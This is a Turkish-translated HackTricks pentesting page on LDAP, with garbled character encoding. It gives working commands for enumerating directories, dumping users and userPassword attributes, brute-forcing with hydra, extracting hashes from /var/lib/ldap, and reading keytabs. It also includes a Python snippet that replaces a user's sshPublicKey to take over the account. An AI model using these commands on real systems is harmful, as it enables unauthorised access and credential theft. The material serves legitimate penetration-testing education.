# 389, 636, 3268, 3269 - Pentesting LDAP

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

**LDAP** (Hafif Dizin EriÅŸim ProtokolÃ¼) kullanÄ±mÄ±, hem kamu hem de Ã¶zel aÄŸlar iÃ§inde organizasyonlar, bireyler ve dosyalar ile cihazlar gibi Ã§eÅŸitli varlÄ±klarÄ± bulmak iÃ§in esasen kullanÄ±lÄ±r. Daha kÃ¼Ã§Ã¼k bir kod ayak izi ile, Ã¶ncÃ¼sÃ¼ DAP'a kÄ±yasla daha akÄ±cÄ± bir yaklaÅŸÄ±m sunar.

LDAP dizinleri, birkaÃ§ sunucuya daÄŸÄ±tÄ±lmalarÄ±nÄ± saÄŸlamak iÃ§in yapÄ±landÄ±rÄ±lmÄ±ÅŸtÄ±r; her sunucu, Dizin Sistemi AjanÄ± (DSA) olarak adlandÄ±rÄ±lan dizinin **Ã§oÄŸaltÄ±lmÄ±ÅŸ** ve **senkronize** bir versiyonunu barÄ±ndÄ±rÄ±r. Ä°stekleri iÅŸleme sorumluluÄŸu tamamen LDAP sunucusuna aittir; bu sunucu, talep sahibine birleÅŸik bir yanÄ±t sunmak iÃ§in gerektiÄŸinde diÄŸer DSAlar ile iletiÅŸim kurabilir.

LDAP dizininin organizasyonu, **en Ã¼stte kÃ¶k dizin ile baÅŸlayan bir aÄŸaÃ§ hiyerarÅŸisini** andÄ±rÄ±r. Bu, Ã¼lkelere, ardÄ±ndan organizasyonlara ve daha sonra Ã§eÅŸitli bÃ¶lÃ¼mleri veya departmanlarÄ± temsil eden organizasyonel birimlere ayrÄ±lÄ±r ve nihayetinde bireysel varlÄ±klar seviyesine, hem insanlar hem de dosyalar ve yazÄ±cÄ±lar gibi paylaÅŸÄ±lan kaynaklar dahil olmak Ã¼zere ulaÅŸÄ±r.

**VarsayÄ±lan port:** 389 ve 636(ldaps). Global Katalog (ActiveDirectory'deki LDAP) varsayÄ±lan olarak 3268 ve 3269 portlarÄ±nda LDAPS iÃ§in mevcuttur.
```
PORT    STATE SERVICE REASON
389/tcp open  ldap    syn-ack
636/tcp open  tcpwrapped
```
### LDAP Veri DeÄŸiÅŸim FormatÄ±

LDIF (LDAP Veri DeÄŸiÅŸim FormatÄ±), dizin iÃ§eriÄŸini bir dizi kayÄ±t olarak tanÄ±mlar. AyrÄ±ca gÃ¼ncelleme taleplerini (Ekle, DeÄŸiÅŸtir, Sil, Yeniden AdlandÄ±r) de temsil edebilir.
```bash
dn: dc=local
dc: local
objectClass: dcObject

dn: dc=moneycorp,dc=local
dc: moneycorp
objectClass: dcObject
objectClass: organization

dn ou=it,dc=moneycorp,dc=local
objectClass: organizationalUnit
ou: dev

dn: ou=marketing,dc=moneycorp,dc=local
objectClass: organizationalUnit
Ou: sales

dn: cn= ,ou= ,dc=moneycorp,dc=local
objectClass: personalData
cn:
sn:
gn:
uid:
ou:
mail: pepe@hacktricks.xyz
phone: 23627387495
```
* SatÄ±r 1-3, Ã¼st dÃ¼zey alan adÄ±nÄ± local olarak tanÄ±mlar
* SatÄ±r 5-8, birinci dÃ¼zey alan adÄ±nÄ± moneycorp (moneycorp.local) olarak tanÄ±mlar
* SatÄ±r 10-16, 2 organizasyonel birimi tanÄ±mlar: dev ve sales
* SatÄ±r 18-26, alanÄ±n bir nesnesini oluÅŸturur ve deÄŸerlerle birlikte nitelikler atar

## Veri yazma

DeÄŸerleri deÄŸiÅŸtirebiliyorsanÄ±z, gerÃ§ekten ilginÃ§ eylemler gerÃ§ekleÅŸtirebilirsiniz. Ã–rneÄŸin, **kullanÄ±cÄ±nÄ±zÄ±n veya herhangi bir kullanÄ±cÄ±nÄ±n "sshPublicKey" bilgisini deÄŸiÅŸtirebileceÄŸinizi** hayal edin. Bu niteliÄŸin mevcut olmasÄ± durumunda, **ssh'nin genel anahtarlarÄ± LDAP'dan okumasÄ±** oldukÃ§a olasÄ±dÄ±r. Bir kullanÄ±cÄ±nÄ±n genel anahtarÄ±nÄ± deÄŸiÅŸtirebilirseniz, **ÅŸifre kimlik doÄŸrulamasÄ± ssh'da etkin olmasa bile o kullanÄ±cÄ± olarak giriÅŸ yapabileceksiniz.**
```bash
# Example from https://www.n00py.io/2020/02/exploiting-ldap-server-null-bind/
>>> import ldap3
>>> server = ldap3.Server('x.x.x.x', port =636, use_ssl = True)
>>> connection = ldap3.Connection(server, 'uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN', 'PASSWORD', auto_bind=True)
>>> connection.bind()
True
>>> connection.extend.standard.who_am_i()
u'dn:uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN'
>>> connection.modify('uid=USER,ou=USERS,dc=DOMAINM=,dc=DOMAIN',{'sshPublicKey': [(ldap3.MODIFY_REPLACE, ['ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHRMu2et/B5bUyHkSANn2um9/qtmgUTEYmV9cyK1buvrS+K2gEKiZF5pQGjXrT71aNi5VxQS7f+s3uCPzwUzlI2rJWFncueM1AJYaC00senG61PoOjpqlz/EUYUfj6EUVkkfGB3AUL8z9zd2Nnv1kKDBsVz91o/P2GQGaBX9PwlSTiR8OGLHkp2Gqq468QiYZ5txrHf/l356r3dy/oNgZs7OWMTx2Rr5ARoeW5fwgleGPy6CqDN8qxIWntqiL1Oo4ulbts8OxIU9cVsqDsJzPMVPlRgDQesnpdt4cErnZ+Ut5ArMjYXR2igRHLK7atZH/qE717oXoiII3UIvFln2Ivvd8BRCvgpo+98PwN8wwxqV7AWo0hrE6dqRI7NC4yYRMvf7H8MuZQD5yPh2cZIEwhpk7NaHW0YAmR/WpRl4LbT+o884MpvFxIdkN1y1z+35haavzF/TnQ5N898RcKwll7mrvkbnGrknn+IT/v3US19fPJWzl1/pTqmAnkPThJW/k= badguy@evil'])]})
```
## DÃ¼z Metin Kimlik Bilgilerini Dinleme

EÄŸer LDAP SSL olmadan kullanÄ±lÄ±yorsa, aÄŸda **kimlik bilgilerini dÃ¼z metin olarak dinleyebilirsiniz.**

AyrÄ±ca, **LDAP sunucusu ile istemci arasÄ±nda** bir **MITM** saldÄ±rÄ±sÄ± gerÃ§ekleÅŸtirebilirsiniz. Burada, istemcinin **dÃ¼z metin kimlik bilgilerini** kullanarak giriÅŸ yapmasÄ± iÃ§in bir **Downgrade Attack** yapabilirsiniz.

**EÄŸer SSL kullanÄ±lÄ±yorsa**, yukarÄ±da bahsedilen ÅŸekilde **MITM** yapmayÄ± deneyebilirsiniz, ancak **yanlÄ±ÅŸ bir sertifika** sunarak, eÄŸer **kullanÄ±cÄ± bunu kabul ederse**, kimlik doÄŸrulama yÃ¶ntemini dÃ¼ÅŸÃ¼rme ve kimlik bilgilerini tekrar gÃ¶rme imkanÄ±nÄ±z olur.

## Anonim EriÅŸim

### TLS SNI kontrolÃ¼nÃ¼ atlama

[**bu yazÄ±ya**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) gÃ¶re, LDAP sunucusuna rastgele bir alan adÄ± (Ã¶rneÄŸin company.com) ile eriÅŸerek, anonim bir kullanÄ±cÄ± olarak LDAP hizmetiyle iletiÅŸim kurup bilgi Ã§Ä±karabildi.
```bash
ldapsearch -H ldaps://company.com:636/ -x -s base -b '' "(objectClass=*)" "*" +
```
### LDAP anonim baÄŸlanmalarÄ±

[LDAP anonim baÄŸlanmalarÄ±](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/anonymous-ldap-operations-active-directory-disabled), **kimlik doÄŸrulamasÄ± yapÄ±lmamÄ±ÅŸ saldÄ±rganlarÄ±n** alan bilgilerini, kullanÄ±cÄ±larÄ±n, gruplarÄ±n, bilgisayarlarÄ±n, kullanÄ±cÄ± hesap Ã¶zelliklerinin ve alan parola politikasÄ±nÄ±n tam listesini almasÄ±na olanak tanÄ±r. Bu, **eski bir yapÄ±landÄ±rmadÄ±r** ve Windows Server 2003 itibarÄ±yla yalnÄ±zca kimlik doÄŸrulamasÄ± yapÄ±lmÄ±ÅŸ kullanÄ±cÄ±larÄ±n LDAP istekleri baÅŸlatmasÄ±na izin verilmektedir.\
Ancak, yÃ¶neticiler **anonim baÄŸlanmalara izin vermek iÃ§in belirli bir uygulama kurmak zorunda kalmÄ±ÅŸ olabilir** ve bÃ¶ylece kimlik doÄŸrulamasÄ± yapÄ±lmamÄ±ÅŸ kullanÄ±cÄ±lara AD'deki tÃ¼m nesnelere eriÅŸim vermiÅŸ olabilirler.

## GeÃ§erli Kimlik Bilgileri

LDAP sunucusuna giriÅŸ yapmak iÃ§in geÃ§erli kimlik bilgilerine sahipseniz, aÅŸaÄŸÄ±daki komutla Alan YÃ¶neticisi hakkÄ±nda tÃ¼m bilgileri dÃ¶kebilirsiniz:

[ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)
```bash
pip3 install ldapdomaindump
ldapdomaindump <IP> [-r <IP>] -u '<domain>\<username>' -p '<password>' [--authtype SIMPLE] --no-json --no-grep [-o /path/dir]
```
### [Brute Force](../generic-hacking/brute-force.md#ldap)

## Enumeration

### Automated

Bunu kullanarak **kamusal bilgileri** (alan adÄ± gibi)** gÃ¶rebileceksiniz:**
```bash
nmap -n -sV --script "ldap* and not brute" <IP> #Using anonymous credentials
```
### Python

<details>

<summary>Python ile LDAP enumerasyonu gÃ¶rÃ¼n</summary>

**Kimlik bilgileri ile veya kimlik bilgileri olmadan bir LDAP'Ä± enumerate etmeyi deneyebilirsiniz**: `pip3 install ldap3`

Ã–nce **kimlik bilgileri olmadan** baÄŸlanmayÄ± deneyin:
```bash
>>> import ldap3
>>> server = ldap3.Server('x.X.x.X', get_info = ldap3.ALL, port =636, use_ssl = True)
>>> connection = ldap3.Connection(server)
>>> connection.bind()
True
>>> server.info
```
EÄŸer yanÄ±t `True` ise, Ã¶nceki Ã¶rnekte olduÄŸu gibi, LDAP sunucusundan bazÄ± **ilginÃ§ veriler** (Ã¶rneÄŸin **isim baÄŸlamÄ±** veya **alan adÄ±**) elde edebilirsiniz:
```bash
>>> server.info
DSA info (from DSE):
Supported LDAP versions: 3
Naming contexts:
dc=DOMAIN,dc=DOMAIN
```
Bir isimlendirme baÄŸlamÄ±na sahip olduÄŸunuzda, daha heyecan verici sorgular yapabilirsiniz. Bu basit sorgu, dizindeki tÃ¼m nesneleri gÃ¶sterecektir:
```bash
>>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=*))', search_scope='SUBTREE', attributes='*')
True
>> connection.entries
```
Veya **dump** tÃ¼m ldap:
```bash
>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=person))', search_scope='SUBTREE', attributes='userPassword')
True
>>> connection.entries
```
</details>

### windapsearch

[**Windapsearch**](https://github.com/ropnop/windapsearch) , LDAP sorgularÄ±nÄ± kullanarak bir Windows alanÄ±ndan **kullanÄ±cÄ±larÄ±, gruplarÄ± ve bilgisayarlarÄ± listelemek** iÃ§in yararlÄ± bir Python betiÄŸidir.
```bash
# Get computers
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --computers
# Get groups
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --groups
# Get users
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --da
# Get Domain Admins
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --da
# Get Privileged Users
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --privileged-users
```
### ldapsearch

BoÅŸ kimlik bilgilerini kontrol edin veya kimlik bilgilerinizin geÃ§erli olup olmadÄ±ÄŸÄ±nÄ± kontrol edin:
```bash
ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
```

```bash
# CREDENTIALS NOT VALID RESPONSE
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A4C, comment: In order to perform this opera
tion a successful bind must be completed on the connection., data 0, v3839
```
EÄŸer "_bind must be completed_" diyen bir ÅŸey bulursanÄ±z, bu kimlik bilgilerin yanlÄ±ÅŸ olduÄŸu anlamÄ±na gelir.

**Bir alan adÄ±ndan her ÅŸeyi** Ã§Ä±kartabilirsiniz:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
-x Simple Authentication
-H LDAP Server
-D My User
-w My password
-b Base site, all data from here will be given
```
KullanÄ±cÄ±larÄ± Ã§Ä±karÄ±n:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
#Example: ldapsearch -x -H ldap://<IP> -D 'MYDOM\john' -w 'johnpassw' -b "CN=Users,DC=mydom,DC=local"
```
**bilgisayarlar**:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Computers,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
**bilgilerimi Ã§Ä±kar**
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=<MY NAME>,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
**Domain Admins**'Ä± Ã§Ä±karÄ±n:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
**Domain Users**'Ä± Ã§Ä±karÄ±n:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Users,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
**Enterprise Admins**'Ä± Ã§Ä±karÄ±n:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Enterprise Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
**YÃ¶netici**:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Administrators,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
**Uzak MasaÃ¼stÃ¼ Grubu**:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Remote Desktop Users,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
Parolaya eriÅŸiminiz olup olmadÄ±ÄŸÄ±nÄ± gÃ¶rmek iÃ§in, sorgulardan birini Ã§alÄ±ÅŸtÄ±rdÄ±ktan sonra grep kullanabilirsiniz:
```bash
<ldapsearchcmd...> | grep -i -A2 -B2 "userpas"
```
LÃ¼tfen, burada bulabileceÄŸiniz ÅŸifrelerin gerÃ§ek olmayabileceÄŸini unutmayÄ±n...

#### pbis

**pbis**'i buradan indirebilirsiniz: [https://github.com/BeyondTrust/pbis-open/](https://github.com/BeyondTrust/pbis-open/) ve genellikle `/opt/pbis` dizinine kurulur.\
**Pbis**, temel bilgilere kolayca eriÅŸmenizi saÄŸlar:
```bash
#Read keytab file
./klist -k /etc/krb5.keytab

#Get known domains info
./get-status
./lsa get-status

#Get basic metrics
./get-metrics
./lsa get-metrics

#Get users
./enum-users
./lsa enum-users

#Get groups
./enum-groups
./lsa enum-groups

#Get all kind of objects
./enum-objects
./lsa enum-objects

#Get groups of a user
./list-groups-for-user <username>
./lsa list-groups-for-user <username>
#Get groups of each user
./enum-users | grep "Name:" | sed -e "s,\\\,\\\\\\\,g" | awk '{print $2}' | while read name; do ./list-groups-for-user "$name"; echo -e "========================\n"; done

#Get users of a group
./enum-members --by-name "domain admins"
./lsa enum-members --by-name "domain admins"
#Get users of each group
./enum-groups | grep "Name:" | sed -e "s,\\\,\\\\\\\,g" | awk '{print $2}' | while read name; do echo "$name"; ./enum-members --by-name "$name"; echo -e "========================\n"; done

#Get description of each user
./adtool -a search-user --name CN="*" --keytab=/etc/krb5.keytab -n <Username> | grep "CN" | while read line; do
echo "$line";
./adtool --keytab=/etc/krb5.keytab -n <username> -a lookup-object --dn="$line" --attr "description";
echo "======================"
done
```
## Grafik ArayÃ¼zÃ¼

### Apache Directory

[**Apache Directory'yi buradan indirin**](https://directory.apache.org/studio/download/download-linux.html). Bu aracÄ±n nasÄ±l kullanÄ±lacaÄŸÄ±na dair bir [Ã¶rneÄŸi burada bulabilirsiniz](https://www.youtube.com/watch?v=VofMBg2VLnw\&t=3840s).

### jxplorer

LDAP sunucusu ile grafik bir arayÃ¼zÃ¼ buradan indirebilirsiniz: [http://www.jxplorer.org/downloads/users.html](http://www.jxplorer.org/downloads/users.html)

VarsayÄ±lan olarak ÅŸu dizine kurulur: _/opt/jxplorer_

![](<../.gitbook/assets/image (482).png>)

### Godap

Godap, AD ve diÄŸer LDAP sunucularÄ±ndaki nesneler ve niteliklerle etkileÅŸimde bulunmak iÃ§in kullanÄ±labilen etkileÅŸimli bir terminal kullanÄ±cÄ± arayÃ¼zÃ¼dÃ¼r. Windows, Linux ve MacOS iÃ§in mevcuttur ve basit baÄŸlamalar, pass-the-hash, pass-the-ticket ve pass-the-cert gibi yÃ¶ntemlerin yanÄ± sÄ±ra nesneleri arama/oluÅŸturma/deÄŸiÅŸtirme/silme, gruplardan kullanÄ±cÄ± ekleme/Ã§Ä±karma, ÅŸifre deÄŸiÅŸtirme, nesne izinlerini (DACL'ler) dÃ¼zenleme, Active-Directory Entegre DNS (ADIDNS) deÄŸiÅŸtirme, JSON dosyalarÄ±na aktarma gibi birkaÃ§ Ã¶zel Ã¶zelliÄŸi destekler.

![](<../.gitbook/assets/godap.png>)

Buna [https://github.com/Macmod/godap](https://github.com/Macmod/godap) adresinden eriÅŸebilirsiniz. KullanÄ±m Ã¶rnekleri ve talimatlar iÃ§in [Wiki'yi](https://github.com/Macmod/godap/wiki) okuyun.

### Ldapx

Ldapx, diÄŸer araÃ§lardan LDAP trafiÄŸini incelemek ve dÃ¶nÃ¼ÅŸtÃ¼rmek iÃ§in kullanÄ±labilen esnek bir LDAP proxy'sidir. Kimlik koruma ve LDAP izleme araÃ§larÄ±nÄ± atlatmaya Ã§alÄ±ÅŸmak iÃ§in LDAP trafiÄŸini belirsizleÅŸtirmek amacÄ±yla kullanÄ±labilir ve [MaLDAPtive](https://www.youtube.com/watch?v=mKRS5Iyy7Qo) konuÅŸmasÄ±nda sunulan yÃ¶ntemlerin Ã§oÄŸunu uygular.

![](<../.gitbook/assets/ldapx.png>)

Bunu [https://github.com/Macmod/ldapx](https://github.com/Macmod/ldapx) adresinden edinebilirsiniz.

## Kerberos ile Kimlik DoÄŸrulama

`ldapsearch` kullanarak **NTLM** yerine **kerberos** ile **kimlik doÄŸrulamasÄ±** yapabilirsiniz; bunun iÃ§in `-Y GSSAPI` parametresini kullanÄ±n.

## POST

VeritabanlarÄ±nÄ±n bulunduÄŸu dosyalara eriÅŸiminiz varsa (bu _/var/lib/ldap_ iÃ§inde olabilir). Hash'leri Ã§Ä±karmak iÃ§in:
```bash
cat /var/lib/ldap/*.bdb | grep -i -a -E -o "description.*" | sort | uniq -u
```
You can feed john with the password hash (from '{SSHA}' to 'structural' without adding 'structural').

### YapÄ±landÄ±rma DosyalarÄ±

* Genel
* containers.ldif
* ldap.cfg
* ldap.conf
* ldap.xml
* ldap-config.xml
* ldap-realm.xml
* slapd.conf
* IBM SecureWay V3 sunucusu
* V3.sas.oc
* Microsoft Active Directory sunucusu
* msadClassesAttrs.ldif
* Netscape Directory Server 4
* nsslapd.sas\_at.conf
* nsslapd.sas\_oc.conf
* OpenLDAP dizin sunucusu
* slapd.sas\_at.conf
* slapd.sas\_oc.conf
* Sun ONE Directory Server 5.1
* 75sas.ldif

## HackTricks Otomatik Komutlar
```
Protocol_Name: LDAP    #Protocol Abbreviation if there is one.
Port_Number:  389,636     #Comma separated if there is more than one.
Protocol_Description: Lightweight Directory Access Protocol         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for LDAP
Note: |
The use of LDAP (Lightweight Directory Access Protocol) is mainly for locating various entities such as organizations, individuals, and resources like files and devices within networks, both public and private. It offers a streamlined approach compared to its predecessor, DAP, by having a smaller code footprint.

https://book.hacktricks.xyz/pentesting/pentesting-ldap

Entry_2:
Name: Banner Grab
Description: Grab LDAP Banner
Command: nmap -p 389 --script ldap-search -Pn {IP}

Entry_3:
Name: LdapSearch
Description: Base LdapSearch
Command: ldapsearch -H ldap://{IP} -x

Entry_4:
Name: LdapSearch Naming Context Dump
Description: Attempt to get LDAP Naming Context
Command: ldapsearch -H ldap://{IP} -x -s base namingcontexts

Entry_5:
Name: LdapSearch Big Dump
Description: Need Naming Context to do big dump
Command: ldapsearch -H ldap://{IP} -x -b "{Naming_Context}"

Entry_6:
Name: Hydra Brute Force
Description: Need User
Command: hydra -l {Username} -P {Big_Passwordlist} {IP} ldap2 -V -f
```
{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
